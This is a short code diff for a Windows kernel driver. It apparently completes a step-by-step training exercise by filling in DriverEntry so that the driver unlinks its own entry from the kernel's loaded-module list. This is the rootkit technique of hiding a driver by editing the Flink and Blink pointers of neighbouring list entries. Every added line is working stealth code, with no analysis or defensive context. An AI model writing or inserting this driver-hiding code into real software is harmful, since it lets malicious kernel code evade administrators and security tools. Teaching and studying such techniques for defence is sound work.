@@ -38,12 +38,17 @@ DriverEntry(
     DPF(( "*** %s.sys Loaded ***\n", __MODULE__ ));
 
     // Step #1 : Get a pointer to the PKLDR_DATA_TABLE_ENTRY for this driver
+    LdrDataTableEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
 
     // Step #2 : Retrieve Pointers to the LIST_ENTRY structure for 
     // the previous and next nodes in the module list
+    PrevListEntry = LdrDataTableEntry->Links.Blink;
+    NextListEntry = LdrDataTableEntry->Links.Flink;
 
     // Step #3 : Modify the previous and next LIST_ENTRY structures to remove 
     // the node for the driver from the module list
+    PrevListEntry->Flink = NextListEntry;
+    NextListEntry->Blink = PrevListEntry;
 
     return STATUS_SUCCESS;
 } // DriverEntry()
